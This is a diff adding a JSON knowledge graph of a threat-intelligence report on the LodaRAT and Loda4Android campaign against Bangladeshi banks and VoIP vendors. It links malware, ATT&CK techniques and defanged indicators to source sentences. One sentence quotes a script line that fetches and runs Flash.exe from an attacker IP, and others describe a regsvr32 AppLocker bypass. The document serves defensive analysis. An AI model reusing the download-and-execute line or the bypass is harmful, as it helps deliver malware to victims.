@@ -1,0 +1,750 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_069ca7d00265",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "carrier-grade voice-over-IP software vendors",
+        "edges": [],
+        "sentence_indices": [
+          20
+        ],
+        "span_sentences": [
+          "The operators of this Loda campaign appear to have a specific interest in Bangladesh-based organizations, namely banks and carrier-grade voice-over-IP software vendors, which we observed on several lures attempting to distribute the malware droppers."
+        ]
+      },
+      {
+        "node_id": "HL_1a06f9b6bbce",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "LodaRAT",
+        "edges": [
+          "EDGE_1"
+        ],
+        "sentence_indices": [
+          0,
+          5,
+          40
+        ],
+        "span_sentences": [
+          "Kasablanca, the group behind LodaRAT, seems to be motivated by information gathering and espionage rather than direct financial gain.",
+          "LodaRAT operators and/or developers now have a new tool, Loda4Android.",
+          "The Windows-based samples identified during this investigation are updated versions of LodaRAT."
+        ]
+      },
+      {
+        "node_id": "HL_397879e4947d",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Loda4Android",
+        "edges": [
+          "EDGE_2",
+          "EDGE_3",
+          "EDGE_4"
+        ],
+        "sentence_indices": [
+          5,
+          8,
+          28,
+          33
+        ],
+        "span_sentences": [
+          "LodaRAT operators and/or developers now have a new tool, Loda4Android.",
+          "These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\"\nTalos identified hybrid campaigns targeting Windows and Android users.",
+          "Before we delve into the malware, details it's important to explain why Talos has determined with high confidence that the developers/operators behind Loda are the same behind this new Loda4Android sample.",
+          "Loda4Android is not capable of intercepting SMS messages or phone calls, though, as is commonly seen in other banking trojans."
+        ]
+      },
+      {
+        "node_id": "HL_44463ac59fa0",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows",
+        "edges": [],
+        "sentence_indices": [
+          3,
+          7,
+          8,
+          11,
+          13,
+          17,
+          21,
+          22,
+          40,
+          45,
+          48,
+          49
+        ],
+        "span_sentences": [
+          "Just like its Windows version, the Android version is also a remote access tool (RAT) with the features one would expect out of this kind of malware.",
+          "Along with this new Android variant, an updated version of Loda for Windows has been identified in the same campaign.",
+          "These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\"\nTalos identified hybrid campaigns targeting Windows and Android users.",
+          "The underlying command and control (C2) protocol follows the same design pattern as the Windows version, suggesting that the C2 code will handle both versions.",
+          "Talos has identified a campaign starting October 2020 and was still active at the time of writing this article, which is now targeting Windows and Android platforms.",
+          "The Windows version (see details below) uses the IP 107.172.30[.]213 as the dropper site, which hosts the download scripts (first stage) and main payload.",
+          "The default victim ID on the Windows version is \"munafa,\" which is the Urdu and Bengalese word for \"profit.\"\nAdversaries use a malicious RTF document that exploits CVE-2017-11882 — a memory corruption vulnerability in Microsoft Office — that, in turn, downloads a malicious SCT file.",
+          "This is a known technique for bypassing AppLocker in Windows by abusing the regsvr32 command.",
+          "The Windows-based samples identified during this investigation are updated versions of LodaRAT.",
+          "To achieve this, Loda first changes a few security configurations in Windows:\n\nAfter these changes are made, an unidentified networking utility named \"nx.exe\" establishes a connection on the standard RDP port 3389.",
+          "Several functions are called from a BASS audio DLL which Loda has named \"bacb.dll.\" The functions that are called to record audio are:\n- BASS_ErrorGetCode\n- BASS_RecordGetDeviceInfo\n- BASS_RecordInit\n- BASS_RecordSetDevice\n- BASS_RecordFree\n- BASS_Encode_Start\n- BASS_Encode_Stop\nThis new command is an improvement on the previous \"Sound\" command which used Windows' built-in Sound Recorder.",
+          "The reason for abandoning the previous method is likely because Windows Sound Recorder can only record audio for a maximum of 60 seconds."
+        ]
+      },
+      {
+        "node_id": "HL_59e000caf392",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "nx.exe",
+        "edges": [
+          "EDGE_5",
+          "EDGE_6"
+        ],
+        "sentence_indices": [
+          45
+        ],
+        "span_sentences": [
+          "To achieve this, Loda first changes a few security configurations in Windows:\n\nAfter these changes are made, an unidentified networking utility named \"nx.exe\" establishes a connection on the standard RDP port 3389."
+        ]
+      },
+      {
+        "node_id": "HL_7a83293baae8",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Android",
+        "edges": [],
+        "sentence_indices": [
+          2,
+          3,
+          4,
+          6,
+          7,
+          8,
+          9,
+          13,
+          18,
+          19,
+          37
+        ],
+        "span_sentences": [
+          "Loda now has an Android version.",
+          "Just like its Windows version, the Android version is also a remote access tool (RAT) with the features one would expect out of this kind of malware.",
+          "This Android RAT had been previously referred to as \"Gaza007.\" However, Talos linked it to the Loda developers and uncovered a full campaign targeting Bangladeshi users.",
+          "This new malware follows the same principles of other Android-based RATs that we have seen on the threat landscape.",
+          "Along with this new Android variant, an updated version of Loda for Windows has been identified in the same campaign.",
+          "These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\"\nTalos identified hybrid campaigns targeting Windows and Android users.",
+          "The authors developed an Android-based RAT following the same principles as other RATs.",
+          "Talos has identified a campaign starting October 2020 and was still active at the time of writing this article, which is now targeting Windows and Android platforms.",
+          "For this specific campaign, the malicious actors used the IP address 160.178.220[.]194 as a C2 and as hosting site for the Android version in its early stages, the following samples also changed their C2 to info.v-pn[.]co.",
+          "Based on the certificate fingerprint used to sign both Android samples, we believe the C2 recently changed to info.v-pn[.]co and the distribution is currently being carried out from a newly identified domain lap-top[.]xyz.",
+          "For example, it could download one of the available Android exploits and obtain root, or it could download a new APK and install it."
+        ]
+      },
+      {
+        "node_id": "HL_7e06f5c51ede",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Loda4Windows",
+        "edges": [],
+        "sentence_indices": [
+          8
+        ],
+        "span_sentences": [
+          "These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\"\nTalos identified hybrid campaigns targeting Windows and Android users."
+        ]
+      },
+      {
+        "node_id": "HL_87ab9c6ee758",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Loda",
+        "edges": [],
+        "sentence_indices": [
+          1,
+          43,
+          51,
+          53
+        ],
+        "span_sentences": [
+          "Threat actors attempt to evolve over time and the ones behind Loda are no different.",
+          "Multiple commands in Loda have been updated or are entirely new additions.",
+          "The threat actor behind Loda is diversifying its target platforms and continuously improving functionality.",
+          "As is the case with earlier versions of Loda, both versions of this new iteration pose a serious threat, as they can lead to a significant data breach or heavy financial loss."
+        ]
+      },
+      {
+        "node_id": "HL_a4b0a14a8fa9",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "regsvr32",
+        "edges": [
+          "EDGE_7"
+        ],
+        "sentence_indices": [
+          22
+        ],
+        "span_sentences": [
+          "This is a known technique for bypassing AppLocker in Windows by abusing the regsvr32 command."
+        ]
+      },
+      {
+        "node_id": "HL_a6118de3a56b",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Facebook",
+        "edges": [],
+        "sentence_indices": [
+          34
+        ],
+        "span_sentences": [
+          "There are also two other interesting features — including a built-in Facebook phishing kit."
+        ]
+      },
+      {
+        "node_id": "HL_b5d7fa07697c",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "banks",
+        "edges": [],
+        "sentence_indices": [
+          20
+        ],
+        "span_sentences": [
+          "The operators of this Loda campaign appear to have a specific interest in Bangladesh-based organizations, namely banks and carrier-grade voice-over-IP software vendors, which we observed on several lures attempting to distribute the malware droppers."
+        ]
+      },
+      {
+        "node_id": "HL_b9d0f6be6814",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Kasablanca",
+        "edges": [],
+        "sentence_indices": [
+          0,
+          8
+        ],
+        "span_sentences": [
+          "Kasablanca, the group behind LodaRAT, seems to be motivated by information gathering and espionage rather than direct financial gain.",
+          "These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\"\nTalos identified hybrid campaigns targeting Windows and Android users."
+        ]
+      },
+      {
+        "node_id": "HL_cacf2de3bd1d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AppLocker",
+        "edges": [
+          "EDGE_8"
+        ],
+        "sentence_indices": [
+          22,
+          23
+        ],
+        "span_sentences": [
+          "This is a known technique for bypassing AppLocker in Windows by abusing the regsvr32 command.",
+          "Using this technique, an attacker can download and execute an SCT file while simultaneously bypassing Applocker."
+        ]
+      },
+      {
+        "node_id": "HL_cc9c0c761f31",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Bangladesh",
+        "edges": [],
+        "sentence_indices": [
+          4,
+          20
+        ],
+        "span_sentences": [
+          "This Android RAT had been previously referred to as \"Gaza007.\" However, Talos linked it to the Loda developers and uncovered a full campaign targeting Bangladeshi users.",
+          "The operators of this Loda campaign appear to have a specific interest in Bangladesh-based organizations, namely banks and carrier-grade voice-over-IP software vendors, which we observed on several lures attempting to distribute the malware droppers."
+        ]
+      },
+      {
+        "node_id": "HL_d2df92a8d04d",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Gaza007 RAT",
+        "edges": [],
+        "sentence_indices": [
+          39
+        ],
+        "span_sentences": [
+          "Talos also discovered the malware had been identified as \"Gaza007 RAT\" in this post, which contains a full list of commands with a short description."
+        ]
+      },
+      {
+        "node_id": "HL_ddcd4947b0b9",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Gaza007",
+        "edges": [],
+        "sentence_indices": [
+          4
+        ],
+        "span_sentences": [
+          "This Android RAT had been previously referred to as \"Gaza007.\" However, Talos linked it to the Loda developers and uncovered a full campaign targeting Bangladeshi users."
+        ]
+      },
+      {
+        "node_id": "HL_e3c10fd9ca67",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "GitHub",
+        "edges": [],
+        "sentence_indices": [
+          25
+        ],
+        "span_sentences": [
+          "We located the GitHub repository the threat actor used as a template for the SCT file."
+        ]
+      },
+      {
+        "node_id": "HL_ec3570bf1f6d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Office",
+        "edges": [
+          "EDGE_9"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "The default victim ID on the Windows version is \"munafa,\" which is the Urdu and Bengalese word for \"profit.\"\nAdversaries use a malicious RTF document that exploits CVE-2017-11882 — a memory corruption vulnerability in Microsoft Office — that, in turn, downloads a malicious SCT file."
+        ]
+      },
+      {
+        "node_id": "HL_f5429c85dc20",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Talos",
+        "edges": [],
+        "sentence_indices": [
+          4,
+          8,
+          12,
+          13,
+          28,
+          39
+        ],
+        "span_sentences": [
+          "This Android RAT had been previously referred to as \"Gaza007.\" However, Talos linked it to the Loda developers and uncovered a full campaign targeting Bangladeshi users.",
+          "These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\"\nTalos identified hybrid campaigns targeting Windows and Android users.",
+          "Talos researchers have found both reversions reporting to the same C2 hostname and port, further confirming our assertions.",
+          "Talos has identified a campaign starting October 2020 and was still active at the time of writing this article, which is now targeting Windows and Android platforms.",
+          "Before we delve into the malware, details it's important to explain why Talos has determined with high confidence that the developers/operators behind Loda are the same behind this new Loda4Android sample.",
+          "Talos also discovered the malware had been identified as \"Gaza007 RAT\" in this post, which contains a full list of commands with a short description."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1021",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1021",
+        "edges": [
+          "EDGE_1",
+          "EDGE_5"
+        ],
+        "best_span_ranges": [
+          [
+            41,
+            44
+          ],
+          [
+            45,
+            45
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "While mostly remaining the same as previously discovered versions, new commands have been added that extend its capabilities and utilize a slightly different infection chain.",
+            "The new version number of 1.1.8 can be found in the initial C2 beacon, as shown below:.",
+            "Multiple commands in Loda have been updated or are entirely new additions.",
+            "The most notable of these commands gives the threat actor remote access to the target machine via RDP."
+          ],
+          [
+            "To achieve this, Loda first changes a few security configurations in Windows:\n\nAfter these changes are made, an unidentified networking utility named \"nx.exe\" establishes a connection on the standard RDP port 3389."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_2"
+        ],
+        "best_span_ranges": [
+          [
+            23,
+            23
+          ],
+          [
+            36,
+            36
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Using this technique, an attacker can download and execute an SCT file while simultaneously bypassing Applocker."
+          ],
+          [
+            "The malware also contains a command- and script-running capability, which provides the malware flexibility to perform a wide range of tasks."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_6",
+          "EDGE_10",
+          "EDGE_12"
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            17
+          ],
+          [
+            23,
+            23
+          ],
+          [
+            27,
+            27
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The Windows version (see details below) uses the IP 107.172.30[.]213 as the dropper site, which hosts the download scripts (first stage) and main payload."
+          ],
+          [
+            "Using this technique, an attacker can download and execute an SCT file while simultaneously bypassing Applocker."
+          ],
+          [
+            "The line \"\"Object.Open(\"GET\", \"hxxp://107[.]172[.]30[.]213/Flash.exe\", false);\" initiates the download of the Loda binary then executes it."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1113",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1113",
+        "edges": [
+          "EDGE_3"
+        ],
+        "best_span_ranges": [
+          [
+            30,
+            30
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "It has all the components of a stalker application — the malware can record users' location and environment audio, as well as take photos and screenshots."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1123",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1123",
+        "edges": [
+          "EDGE_4"
+        ],
+        "best_span_ranges": [
+          [
+            30,
+            30
+          ],
+          [
+            47,
+            47
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "It has all the components of a stalker application — the malware can record users' location and environment audio, as well as take photos and screenshots."
+          ],
+          [
+            "Another notable new command is \"Sound|\" which uses the BASS audio library to capture audio from a connected microphone."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1203",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1203",
+        "edges": [
+          "EDGE_9",
+          "EDGE_15"
+        ],
+        "best_span_ranges": [
+          [
+            21,
+            21
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The default victim ID on the Windows version is \"munafa,\" which is the Urdu and Bengalese word for \"profit.\"\nAdversaries use a malicious RTF document that exploits CVE-2017-11882 — a memory corruption vulnerability in Microsoft Office — that, in turn, downloads a malicious SCT file."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1218",
+        "edges": [
+          "EDGE_7",
+          "EDGE_8"
+        ],
+        "best_span_ranges": [
+          [
+            23,
+            23
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Using this technique, an attacker can download and execute an SCT file while simultaneously bypassing Applocker."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1566",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            33,
+            34
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Loda4Android is not capable of intercepting SMS messages or phone calls, though, as is commonly seen in other banking trojans.",
+            "There are also two other interesting features — including a built-in Facebook phishing kit."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1583",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1583",
+        "edges": [
+          "EDGE_11",
+          "EDGE_13",
+          "EDGE_14",
+          "EDGE_16"
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Based on the certificate fingerprint used to sign both Android samples, we believe the C2 recently changed to info.v-pn[.]co and the distribution is currently being carried out from a newly identified domain lap-top[.]xyz."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_14a3d84da854",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "107.172.30[.]213",
+        "edges": [
+          "EDGE_10",
+          "EDGE_11"
+        ],
+        "sentence_indices": [
+          17,
+          27
+        ],
+        "span_sentences": [
+          "The Windows version (see details below) uses the IP 107.172.30[.]213 as the dropper site, which hosts the download scripts (first stage) and main payload.",
+          "The line \"\"Object.Open(\"GET\", \"hxxp://107[.]172[.]30[.]213/Flash.exe\", false);\" initiates the download of the Loda binary then executes it."
+        ]
+      },
+      {
+        "node_id": "IOC_42c5e574dabb",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://107[.]172[.]30[.]213/Flash.exe",
+        "edges": [
+          "EDGE_12"
+        ],
+        "sentence_indices": [
+          27
+        ],
+        "span_sentences": [
+          "The line \"\"Object.Open(\"GET\", \"hxxp://107[.]172[.]30[.]213/Flash.exe\", false);\" initiates the download of the Loda binary then executes it."
+        ]
+      },
+      {
+        "node_id": "IOC_4d441864b317",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "160.178.220[.]194",
+        "edges": [
+          "EDGE_13"
+        ],
+        "sentence_indices": [
+          18
+        ],
+        "span_sentences": [
+          "For this specific campaign, the malicious actors used the IP address 160.178.220[.]194 as a C2 and as hosting site for the Android version in its early stages, the following samples also changed their C2 to info.v-pn[.]co."
+        ]
+      },
+      {
+        "node_id": "IOC_72742c8a7a74",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "lap-top[.]xyz",
+        "edges": [
+          "EDGE_14"
+        ],
+        "sentence_indices": [
+          19
+        ],
+        "span_sentences": [
+          "Based on the certificate fingerprint used to sign both Android samples, we believe the C2 recently changed to info.v-pn[.]co and the distribution is currently being carried out from a newly identified domain lap-top[.]xyz."
+        ]
+      },
+      {
+        "node_id": "IOC_9c59c7073e89",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2017-11882",
+        "edges": [
+          "EDGE_15"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "The default victim ID on the Windows version is \"munafa,\" which is the Urdu and Bengalese word for \"profit.\"\nAdversaries use a malicious RTF document that exploits CVE-2017-11882 — a memory corruption vulnerability in Microsoft Office — that, in turn, downloads a malicious SCT file."
+        ]
+      },
+      {
+        "node_id": "IOC_d30d47b15129",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "info.v-pn[.]co",
+        "edges": [
+          "EDGE_16"
+        ],
+        "sentence_indices": [
+          14,
+          18,
+          19
+        ],
+        "span_sentences": [
+          "The hostname info.v-pn[.]co was first recorded with malicious activity on July 2, 2020 being used as C2 for Loda, this is the exact same day that the domain was also registered.",
+          "For this specific campaign, the malicious actors used the IP address 160.178.220[.]194 as a C2 and as hosting site for the Android version in its early stages, the following samples also changed their C2 to info.v-pn[.]co.",
+          "Based on the certificate fingerprint used to sign both Android samples, we believe the C2 recently changed to info.v-pn[.]co and the distribution is currently being carried out from a newly identified domain lap-top[.]xyz."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_1a06f9b6bbce",
+      "node_v": "TTP_T1021"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_397879e4947d",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_397879e4947d",
+      "node_v": "TTP_T1113"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_397879e4947d",
+      "node_v": "TTP_T1123"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_59e000caf392",
+      "node_v": "TTP_T1021"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_59e000caf392",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_a4b0a14a8fa9",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_cacf2de3bd1d",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_ec3570bf1f6d",
+      "node_v": "TTP_T1203"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "IOC_14a3d84da854",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "IOC_14a3d84da854",
+      "node_v": "TTP_T1583"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "IOC_42c5e574dabb",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "IOC_4d441864b317",
+      "node_v": "TTP_T1583"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "IOC_72742c8a7a74",
+      "node_v": "TTP_T1583"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "IOC_9c59c7073e89",
+      "node_v": "TTP_T1203"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "IOC_d30d47b15129",
+      "node_v": "TTP_T1583"
+    }
+  ]
+}
